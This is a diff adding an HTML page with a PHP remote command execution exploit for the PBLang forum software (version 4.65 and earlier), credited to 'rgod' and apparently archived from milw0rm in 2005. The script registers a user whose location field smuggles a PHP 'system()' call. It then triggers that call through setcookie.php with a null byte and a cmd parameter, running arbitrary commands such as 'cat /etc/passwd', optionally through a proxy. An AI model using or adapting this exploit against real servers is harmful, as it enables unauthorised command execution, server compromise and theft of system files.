@@ -1,0 +1,221 @@
+<html>
+<head>
+<title>PBLang <= 4.65 Remote Command Execution Exploit</title>
+<pre>
+&lt;?php
+/* PBLang 4.65 (possibly prior versions) remote code execution
+   by rgod -&gt; site: http://rgod.altervista.org
+   make these changes in php.ini if you have troubles with this script:
+   allow_call_time_pass_reference = on
+   register_globals = on						       */
+
+   error_reporting(0);
+   ini_set(&quot;max_execution_time&quot;,0);
+   ini_set(&quot;default_socket_timeout&quot;, 2);
+   ob_implicit_flush (1);
+
+   echo '&lt;head&gt;&lt;title&gt;PBLang 4.65 remote commands execution&lt;/title&gt;
+         &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=iso-8859-1&quot;&gt;
+         &lt;style type=&quot;text/css&quot;&gt;
+         &lt;!--
+         body,td,th {color: #00FF00;}
+         body {background-color: #000000;}
+         .Stile5 {font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px; }
+         .Stile6 {font-family: Verdana, Arial, Helvetica, sans-serif;
+	       font-weight: bold;
+	       font-style: italic;
+              }
+         --&gt;
+         &lt;/style&gt;&lt;/head&gt;
+         &lt;body&gt;
+         &lt;p class=&quot;Stile6&quot;&gt;PBLang 4.65 (possibly prior versions) remote commands execution&lt;/p&gt;
+         &lt;p class=&quot;Stile6&quot;&gt;a script by rgod at &lt;a href=&quot;http://rgod.altervista.org&quot; target=&quot;_blank&quot;&gt;http://rgod.altervista.org&lt;/a&gt;&lt;/p&gt;
+         &lt;table width=&quot;84%&quot; &gt;
+         &lt;tr&gt;
+         &lt;td width=&quot;43%&quot;&gt;
+         &lt;form name=&quot;form1&quot; method=&quot;post&quot; action=&quot;'.$SERVER[PHP_SELF].'?path=value&amp;host=value&amp;port=value&amp;command=value&amp;proxy=value&quot;&gt;
+         &lt;p&gt;
+         &lt;input type=&quot;text&quot; name=&quot;host&quot;&gt;
+         &lt;span class=&quot;Stile5&quot;&gt;hostname (ex: www.sitename.com) &lt;/span&gt;&lt;/p&gt;
+         &lt;p&gt;
+         &lt;input type=&quot;text&quot; name=&quot;path&quot;&gt;
+         &lt;span class=&quot;Stile5&quot;&gt;path (ex: /pblang/ or /forum/ or just /) &lt;/span&gt;&lt;/p&gt;
+         &lt;p&gt;
+         &lt;input type=&quot;text&quot; name=&quot;port&quot;&gt;
+         &lt;span class=&quot;Stile5&quot;&gt;specify a port other than 80 (default value) &lt;/span&gt;&lt;/p&gt;
+         &lt;p&gt;
+         &lt;input type=&quot;text&quot; name=&quot;command&quot;&gt;
+         &lt;span class=&quot;Stile5&quot;&gt;a Unix command, example: ls -la to list directories, cat /etc/passwd to show passwd file &lt;/span&gt;&lt;/p&gt;
+         &lt;p&gt;
+         &lt;input type=&quot;text&quot; name=&quot;proxy&quot;&gt;
+         &lt;span class=&quot;Stile5&quot;&gt;send exploit through an HTTP proxy (ip:port)  &lt;/span&gt;&lt;/p&gt;
+         &lt;p&gt;
+         &lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;go!&quot;&gt;
+         &lt;/p&gt;
+         &lt;/form&gt;&lt;/td&gt;
+         &lt;/tr&gt;
+         &lt;/table&gt;
+         &lt;/body&gt;
+         &lt;/html&gt;';
+
+
+function show($headeri)
+{
+$ii=0;
+$ji=0;
+$ki=0;
+$ci=0;
+echo '&lt;table border=&quot;0&quot;&gt;&lt;tr&gt;';
+while ($ii &lt;= strlen($headeri)-1)
+{
+$datai=dechex(ord($headeri[$ii]));
+if ($ji==16) {
+             $ji=0;
+             $ci++;
+             echo &quot;&lt;td&gt;&amp;nbsp;&amp;nbsp;&lt;/td&gt;&quot;;
+             for ($li=0; $li&lt;=15; $li++)
+                      { echo &quot;&lt;td&gt;&quot;.$headeri[$li+$ki].&quot;&lt;/td&gt;&quot;;
+			    }
+            $ki=$ki+16;
+            echo &quot;&lt;/tr&gt;&lt;tr&gt;&quot;;
+            }
+if (strlen($datai)==1) {echo &quot;&lt;td&gt;0&quot;.$datai.&quot;&lt;/td&gt;&quot;;} else
+{echo &quot;&lt;td&gt;&quot;.$datai.&quot;&lt;/td&gt; &quot;;}
+$ii++;
+$ji++;
+}
+for ($li=1; $li&lt;=(16 - (strlen($headeri) % 16)+1); $li++)
+                      { echo &quot;&lt;td&gt;&amp;nbsp&amp;nbsp&lt;/td&gt;&quot;;
+                       }
+
+for ($li=$ci*16; $li&lt;=strlen($headeri); $li++)
+                      { echo &quot;&lt;td&gt;&quot;.$headeri[$li].&quot;&lt;/td&gt;&quot;;
+			    }
+
+echo &quot;&lt;/tr&gt;&lt;/table&gt;&quot;;
+}
+
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+
+
+if (($path&lt;&gt;'') and ($host&lt;&gt;'') and ($command&lt;&gt;''))
+{
+if ($port=='') {$port=80;}
+
+$anumber=rand();
+
+         $data=&quot;user=jimihendrix&quot;.$anumber.&quot;&amp;pass=jimijimi&amp;pass2=jimijimi&amp;em=jimimail&quot;.$anumber.&quot;@jimimail.com&amp;realname=&amp;alias=&amp;msn=&amp;icq=&amp;aim=&amp;yahoo=&amp;qq=&amp;web=http%3A%2F%2F&amp;loc=&quot;.urlencode('madrid&quot;; error_reporting(0); system($HTTP_GET_VARS[cmd]); echo &quot;') .&quot;&amp;pt=colorgination.com+harness+racing+video&amp;av=none&amp;webav=&amp;sig=&amp;regcode=1126055838&amp;lang=en&amp;accept=1&amp;Submit=Submit&quot;;
+
+if ($proxy=='')
+        { $packet=&quot;POST &quot;.$path.&quot;register.php?reg=2 HTTP/1.1\r\n&quot;; }
+        else
+        {
+        $c = preg_match_all($proxy_regex,$proxy,$is_proxy);
+        if ($c==0) {
+                    echo 'check the proxy...&lt;br&gt;';
+	            die;
+	           }
+         else
+	{ $packet=&quot;POST http://&quot;.$host.$path.&quot;register.php?reg=2 HTTP/1.1\r\n&quot;;}
+	}
+
+         $packet.=&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\r\n&quot;;
+         $packet.=&quot;Referer: &quot;.$host.$path.&quot;register.php?reg=1\r\n&quot;;
+         $packet.=&quot;Accept-Language: en\r\n&quot;;
+         $packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
+         $packet.=&quot;Accept-Encoding: gzip, deflate\r\n&quot;;
+         $packet.=&quot;User-Agent: msnbot/1.0 (+http://search.msn.com/msnbot.htm)\r\n&quot;;
+         $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
+         $packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
+         $packet.=&quot;Connection: Keep-Alive\r\n&quot;;
+         $packet.=&quot;Cache-Control: no-cache\r\n\r\n&quot;;
+	 $packet.=$data;
+
+show($packet);
+if ($proxy=='')
+           {$fp=fsockopen(gethostbyname($host),$port);}
+           else
+           {$parts=explode(':',$proxy);
+	    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...&lt;br&gt;';
+	    $fp=fsockopen($parts[0],$parts[1]);
+	    if (!$fp) { echo 'No response from proxy...';
+			die;
+		       }
+	    }
+fputs($fp,$packet);
+$data='';
+if ($proxy=='')
+{
+while (!feof($fp))
+{
+$data.=fgets($fp);
+}
+}
+else
+{
+$data='';
+   while ((!feof($fp)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$data)))
+   {
+      $data.=fread($fp,1);
+   }
+
+}
+fclose($fp);
+echo nl2br(htmlentities($data));
+
+if ($proxy=='')
+        { $packet=&quot;GET &quot;.$path.&quot;setcookie.php?u=jimihendrix&quot;.$anumber.&quot;%00&amp;cmd=&quot;.urlencode($command).&quot; HTTP/1.1\r\n&quot;; }
+        else
+        { $packet=&quot;GET http://&quot;.$host.$path.&quot;setcookie.php?u=jimihendrix&quot;.$anumber.&quot;%00&amp;cmd=&quot;.urlencode($command).&quot; HTTP/1.1\r\n&quot;; }
+
+         $packet.=&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\r\n&quot;;
+         $packet.=&quot;Referer: &quot;.$host.$path.&quot;login.php\r\n&quot;;
+         $packet.=&quot;Accept-Language: en\r\n&quot;;
+         $packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
+         $packet.=&quot;Accept-Encoding: gzip, deflate\r\n&quot;;
+         $packet.=&quot;User-Agent: Mozilla/5.0 (compatible; Konqueror/3.3; Linux) KHTML/3.3.2 (like Gecko)\r\n&quot;;
+         $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
+         $packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
+         $packet.=&quot;Connection: Keep-Alive\r\n&quot;;
+         $packet.=&quot;Cache-Control: no-cache\r\n\r\n&quot;;
+//	 $packet.=$data;
+show($packet);
+if ($proxy=='')
+           {$fp=fsockopen(gethostbyname($host),$port);}
+           else
+           {$parts=explode(':',$proxy);
+	    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...&lt;br&gt;';
+	    $fp=fsockopen($parts[0],$parts[1]);
+	    if (!$fp) { echo 'No response from proxy...';
+			die;
+		       }
+	    }
+
+fputs($fp,$packet);
+$data='';
+if ($proxy=='')
+{
+while (!feof($fp))
+{
+$data.=fgets($fp);
+}
+}
+else
+{
+$data='';
+   while ((!feof($fp)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$data)))
+   {
+      $data.=fread($fp,1);
+   }
+
+}
+fclose($fp);
+echo nl2br(htmlentities($data));
+
+}
+?&gt;
+
+// milw0rm.com [2005-09-07]
+</pre>
+</html>
+
